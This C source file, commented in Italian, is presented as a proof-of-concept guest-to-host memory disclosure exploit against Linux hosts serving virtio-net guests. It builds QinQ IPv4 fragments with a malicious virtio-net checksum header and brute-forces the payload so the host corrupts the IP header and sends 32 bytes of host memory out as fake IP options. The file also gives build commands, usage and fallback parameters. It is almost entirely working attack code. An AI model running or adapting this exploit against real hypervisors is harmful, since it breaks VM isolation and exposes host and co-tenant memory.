// pwnescape_read.c — Guest-side memory disclosure PoC (CVE-2026-99999)
//
// Root cause: l'IPv4 non valida csum_start prima di skb_checksum_help().
// Un CHECKSUM_PARTIAL driftato (csum_start punta sull'header IP del frame
// QinQ; la decapsulazione VLAN lato host sposta network_header) fa scrivere
// il checksum completato SU iph[0] (version/IHL): 0x45 -> 0x4f (IHL 5 -> 15).
// ip_do_fragment() consuma l'IHL mutato e copia 60 byte di "header" da una
// linear head che contiene logicamente solo 28 byte: 32 byte di memoria host
// emessi in egress come finte "IP options".
//
// Ambiente: guest Linux con CAP_NET_RAW, iface virtio-net con IFF_VNET_HDR
//           (Firecracker/qemu). Host kernel PRE-fix (< 6785011f8b16).
// Build: gcc -O2 -Wall -o pwnescape_read pwnescape_read.c
// Usage: ./pwnescape_read <iface> <src_ip> <dst_ip> <frag_id> [csum_start] [csum_offset]

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <net/ethernet.h>
#include <netpacket/packet.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/if_ether.h>
#include <linux/ip.h>
#include <linux/virtio_net.h>
#include <netinet/in.h>

#ifndef IP_MF
#define IP_MF 0x2000
#endif

#ifndef PACKET_VNET_HDR
#define PACKET_VNET_HDR 15
#endif

#define IHL_FLIP_HI 0x4f    /* iph[0] dopo la write driftata: version 4, IHL 15 (60 B) */

#define QINQ_HDR_LEN 22     /* eth(14) + outer 802.1ad(4) + inner 802.1Q(4) */
#define IP4_HDR_LEN 20
#define ETH_HDR_LEN 14
#define VNET_HDR_LEN 10     /* sizeof(struct virtio_net_hdr) */

/* ---------- checksum helpers ---------- */

static uint16_t iph_checksum(const uint8_t *h, int len) {
    uint32_t s = 0;
    for (int i = 0; i < len; i += 2)
        s += (h[i] << 8) | h[i + 1];
    while (s >> 16) s = (s & 0xffff) + (s >> 16);
    return ~s & 0xffff;
}

static uint16_t fold16(uint32_t s) {
    while (s >> 16) s = (s & 0xffff) + (s >> 16);
    return ~s & 0xffff;
}

/* Somma big-endian a granularita' 16 bit (com'e' fatta da skb_checksum) */
static uint32_t be_sum(const uint8_t *p, int n) {
    uint32_t s = 0;
    for (int i = 0; i + 1 < n; i += 2) s += (p[i] << 8) | p[i + 1];
    if (n & 1) s += p[n - 1] << 8;
    return s;
}

/* Trova x,y (p1[0], p1[1]) tali che l'alto del checksum foldato sia 0x4f.
 * skb_checksum_help scrive il __sum16 in network order:
 *   mem[0] = fold >> 8  (= iph[0] con csum_offset=0)
 * => serve (fold & 0xff00) == 0x4f00. 65536 coppie, sempre risolvibile. */
static int tune_payload(uint8_t *p1, uint32_t base_sum) {
    for (int x = 0; x < 256; x++)
        for (int y = 0; y < 256; y++) {
            uint16_t f = fold16(base_sum + ((uint32_t)x << 8) + y);
            if ((f & 0xff00) == ((uint16_t)IHL_FLIP_HI << 8)) {
                p1[0] = (uint8_t)x; p1[1] = (uint8_t)y;
                return 0;
            }
        }
    return -1;
}

/* ---------- socket / iface ---------- */

static int open_pkt_sock(const char *ifname) {
    int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (fd < 0) { perror("socket"); return -1; }
    int one = 1;
    if (setsockopt(fd, SOL_PACKET, PACKET_VNET_HDR, &one, sizeof(one)) < 0) {
        perror("PACKET_VNET_HDR (serve IFF_VNET_HDR sul tap dell'iface)");
        close(fd); return -1;
    }
    struct sockaddr_ll sll;
    memset(&sll, 0, sizeof(sll));
    sll.sll_family   = AF_PACKET;
    sll.sll_protocol = htons(ETH_P_ALL);
    sll.sll_ifindex  = (int)if_nametoindex(ifname);
    if (!sll.sll_ifindex) {
        fprintf(stderr, "iface %s: %s\n", ifname, strerror(errno));
        close(fd); return -1;
    }
    if (bind(fd, (struct sockaddr *)&sll, sizeof(sll)) < 0) {
        perror("bind"); close(fd); return -1;
    }
    return fd;
}

static int iface_mtu(const char *ifname) {
    struct ifreq ifr;
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) return 1500;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);
    ifr.ifr_name[IFNAMSIZ - 1] = '\0';
    int mtu = 1500;
    if (ioctl(fd, SIOCGIFMTU, &ifr) == 0) mtu = ifr.ifr_mtu;
    close(fd);
    return mtu;
}

/* ---------- costruzione frame (QinQ: 802.1ad + 802.1Q + IPv4) ---------- */

static void qinq_ip_header(uint8_t *f, const uint8_t *dhost, const uint8_t *shost,
                           uint32_t saddr, uint32_t daddr, uint16_t id,
                           uint16_t frag_off_mf, int plen) {
    memcpy(f, dhost, 6); memcpy(f + 6, shost, 6);
    f[12] = 0x88; f[13] = 0xa8;                              /* 802.1ad outer */
    f[14] = 0x00; f[15] = 0x0a; f[16] = 0x81; f[17] = 0x00;  /* vid=10, 802.1Q inner */
    f[18] = 0x00; f[19] = 0x0a; f[20] = 0x08; f[21] = 0x00;  /* vid=10, IPv4 */
    uint8_t *ip = f + QINQ_HDR_LEN;
    ip[0] = 0x45; ip[1] = 0x00;
    *(uint16_t *)(ip + 2) = htons((uint16_t)(IP4_HDR_LEN + plen));
    *(uint16_t *)(ip + 4) = htons(id);
    *(uint16_t *)(ip + 6) = htons(frag_off_mf);
    ip[8] = 64; ip[9] = IPPROTO_UDP;
    memcpy(ip + 12, &saddr, 4); memcpy(ip + 16, &daddr, 4);
    /* ip[20..] = payload, riempito dal chiamante */
    *(uint16_t *)(ip + 10) = iph_checksum(ip, IP4_HDR_LEN);  /* costante: non copre il payload */
}

/* frag1: testa del datagramma, 8 byte di payload, MF=1, offset 0.
 * p1[0..1] sono le variabili libere del tuning del checksum. */
static void build_frag1(uint8_t *f, const uint8_t *dhost, const uint8_t *shost,
                        uint32_t saddr, uint32_t daddr, uint16_t id,
                        const uint8_t *p1) {
    qinq_ip_header(f, dhost, shost, saddr, daddr, id, IP_MF, 8);
    memcpy(f + QINQ_HDR_LEN + IP4_HDR_LEN, p1, 8);
}

/* frammento di coda: offset in unita' da 8 byte, MF=1 tranne sull'ultimo.
 * payload fill 0x41: byte != 0x41 in egress = disclosure host. */
static void build_tail(uint8_t *f, const uint8_t *dhost, const uint8_t *shost,
                       uint32_t saddr, uint32_t daddr, uint16_t id,
                       uint16_t off_units, int last, int plen) {
    qinq_ip_header(f, dhost, shost, saddr, daddr, id,
                   (uint16_t)(off_units | (last ? 0 : IP_MF)), plen);
    memset(f + QINQ_HDR_LEN + IP4_HDR_LEN, 0x41, (size_t)plen);
}

/* ---------- TX con vnet header ---------- */

/* NB: i campi di virtio_net_hdr sono __u16 LITTLE-ENDIAN => assegnazione
 * diretta, NESSUN htons(). */
static int send_vnet(int fd, const uint8_t *frame, size_t flen,
                     uint16_t csum_start, uint16_t csum_offset, uint8_t flags) {
    static uint8_t buf[9400];
    const size_t hs = VNET_HDR_LEN;
    if (hs + flen > sizeof(buf)) { errno = EMSGSIZE; return -1; }
    struct virtio_net_hdr *vh = (struct virtio_net_hdr *)buf;
    memset(vh, 0, hs);
    vh->flags       = flags;
    vh->csum_start  = csum_start;   /* host byte order == LE */
    vh->csum_offset = csum_offset;
    memcpy(buf + hs, frame, flen);
    return (int)send(fd, buf, hs + flen, 0);
}

/* ---------- main ---------- */

int main(int argc, char **argv) {
    const char *ifname = argc > 1 ? argv[1] : "eth0";
    uint32_t saddr = inet_addr(argc > 2 ? argv[2] : "192.0.2.2");
    uint32_t daddr = inet_addr(argc > 3 ? argv[3] : "192.0.2.1");
    uint16_t id    = argc > 4 ? (uint16_t)strtoul(argv[4], NULL, 0) : 0x1337;
    uint16_t csum_start = argc > 5 ? (uint16_t)atoi(argv[5]) : 22;
    uint16_t csum_off   = argc > 6 ? (uint16_t)atoi(argv[6]) : 0;

    uint8_t dhost[6] = { 0x02, 0xfc, 0x00, 0x00, 0x00, 0x05 };  /* MAC gw (192.0.2.1, da ARP) */
    uint8_t shost[6] = { 0x02, 0xfc, 0x00, 0x00, 0x00, 0x01 };  /* MAC eth0 (verificato) */
    uint8_t p1[8]    = { 0xde, 0xad, 0xbe, 0xef, 0x00, 0x00, 0xde, 0xad };

    int mtu = iface_mtu(ifname);
    /* limite send AF_PACKET+VNET_HDR: mtu + eth(14) + VLAN_HLEN(4); tolto il
     * vnet hdr(10) resta il frame max; meno l'overhead QinQ+IP4 (42) il payload */
    int max_frame = mtu + ETH_HDR_LEN + 4 - VNET_HDR_LEN;
    int plen = (max_frame - (QINQ_HDR_LEN + IP4_HDR_LEN)) & ~7;  /* multiplo di 8 */
    if (plen < 400) {
        fprintf(stderr, "MTU %d troppo piccolo per la geometria (serve payload >= ~400)\n", mtu);
        return 1;
    }
    /* il datagramma riassemblato (20 hdr + 8 frag1 + N*plen) deve superare
     * l'MTU egresso => l'host ri-framenta sull'output path (li' scatta il bug) */
    int n_tail = (mtu - 28) / plen + 1;

    fprintf(stderr, "[*] iface %s mtu=%d, payload coda=%d B, %d frammenti di coda\n",
            ifname, mtu, plen, n_tail);

    static uint8_t f1[QINQ_HDR_LEN + IP4_HDR_LEN + 8];
    static uint8_t tailbuf[QINQ_HDR_LEN + IP4_HDR_LEN + 9200];
    if (QINQ_HDR_LEN + IP4_HDR_LEN + plen > sizeof(tailbuf)) {
        fprintf(stderr, "plen overflow (%d)\n", plen);
        return 1;
    }

    /* base_sum = cio' che skb_checksum_help sommera' da csum_start a fine skb:
     *  - header IP di frag1 (20 B) cosi' come trasmesso, campo check INCLUSO
     *    (costante: il check IP non copre i payload, resta valido dopo il tuning)
     *  - p1[2..7] (i byte [0..1] sono le variabili libere del tuning)
     *  - payload di ogni frammento di coda: fill 0x41 =>
     *    be_sum = (plen/2) parole da 0x4141 */
    build_frag1(f1, dhost, shost, saddr, daddr, id, p1);
    uint32_t base = be_sum(f1 + QINQ_HDR_LEN, IP4_HDR_LEN)
                  + be_sum(p1 + 2, 6)
                  + (uint32_t)n_tail * ((uint32_t)plen / 2) * 0x4141u;

    if (tune_payload(p1, base) < 0) { fprintf(stderr, "tuning fallito\n"); return 1; }
    build_frag1(f1, dhost, shost, saddr, daddr, id, p1);  /* rebuild con payload tunato */

    int fd = open_pkt_sock(ifname);
    if (fd < 0) return 1;

    /* 1) frammenti di coda (senza CHECKSUM_PARTIAL) */
    uint16_t off = 1;   /* frag1 porta 8 byte => prima coda a offset unit 1 */
    for (int i = 0; i < n_tail; i++) {
        build_tail(tailbuf, dhost, shost, saddr, daddr, id, off, i == n_tail - 1, plen);
        if (send_vnet(fd, tailbuf, QINQ_HDR_LEN + IP4_HDR_LEN + plen, 0, 0, 0) < 0) {
            fprintf(stderr, "send tail %d: %s\n", i, strerror(errno));
            close(fd);
            return 1;
        }
        off = (uint16_t)(off + plen / 8);
        usleep(1000);
    }
    usleep(2000);

    /* 2) testa: frag1 col vnet_hdr malevolo (CHECKSUM_PARTIAL driftato).
     * csum_start=22 = posizione dell'header IP nel frame QinQ; dopo l'untag
     * lato host il network_header si sposta indietro => la write di
     * skb_checksum_help finisce su iph[0] (csum_offset=0).
     * Se il kernel guest filtra questa geometria al send (virtio_net_hdr_to_skb),
     * provare: ./pwnescape_read <if> <src> <dst> <id> 42 0 */
    if (send_vnet(fd, f1, sizeof(f1), csum_start, csum_off,
                  VIRTIO_NET_HDR_F_NEEDS_CSUM) < 0) {
        fprintf(stderr, "send frag1: %s\n", strerror(errno));
        close(fd);
        return 1;
    }

    printf("[+] frag id=0x%04x: %d frammenti di coda (%d B payload ciascuno) "
           "+ frag1 driftato (csum_start=%u, csum_offset=%u)\n"
           "    atteso in egress host: iph[0] 0x45 -> 0x4f e 32 B di 'IP options' "
           "non-0x41 (disclosure host)\n",
           id, n_tail, plen, csum_start, csum_off);
    close(fd);
    return 0;
}
